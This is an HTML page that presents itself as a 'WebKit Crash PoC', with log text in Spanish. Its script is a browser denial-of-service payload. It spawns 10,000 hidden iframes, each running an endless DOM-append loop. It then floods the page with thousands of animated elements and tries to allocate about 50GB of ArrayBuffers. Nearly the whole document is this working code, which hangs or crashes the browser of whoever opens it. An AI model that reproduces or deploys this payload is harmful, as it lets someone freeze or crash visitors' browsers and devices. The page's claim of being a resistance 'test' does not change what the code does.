<!DOCTYPE html>
<html>
<head>
  <title>WebKit Crash PoC</title>
  <style>
    body {
      background: #111;
      color: #0f0;
      font-family: monospace;
    }
  </style>
</head>
<body>
  <h1>Ejecutando PoC agresivo WebKit...</h1>
  <pre id="log">Inicializando...</pre>

  <script>
    const log = msg => document.getElementById("log").textContent += "\n" + msg;

    try {
      log("Iniciando test de corrupción de capa de renderizado...");

      for (let i = 0; i < 10000; i++) {
        const iframe = document.createElement("iframe");
        iframe.srcdoc = `<script>while(1)document.body.appendChild(document.createElement('div'))<\/script>`;
        iframe.style.position = "absolute";
        iframe.style.top = "-9999px";
        document.body.appendChild(iframe);
        if (i % 100 === 0) log("Iteración " + i);
      }

      log("Probando animaciones y transformaciones pesadas...");

      for (let i = 0; i < 10000; i++) {
        let div = document.createElement("div");
        div.style.width = div.style.height = "100px";
        div.style.background = "#0f0";
        div.style.position = "absolute";
        div.style.top = `${Math.random() * 1000}px`;
        div.style.left = `${Math.random() * 1000}px`;
        div.style.transform = `scale(${Math.random() * 10}) rotate(${Math.random() * 360}deg)`;
        div.style.transition = "all 0.1s linear";
        document.body.appendChild(div);
      }

      log("Forzando liberación de memoria...");

      let arr = [];
      for (let i = 0; i < 50000; i++) {
        arr.push(new ArrayBuffer(1024 * 1024)); // 1MB por entrada
        if (i % 1000 === 0) log("Buffering " + i + "MB");
      }

      log("Test completado. Si no se colgó, el navegador es resistente.");
    } catch (e) {
      log("Excepción: " + e.toString());
    }
  </script>
</body>
</html>
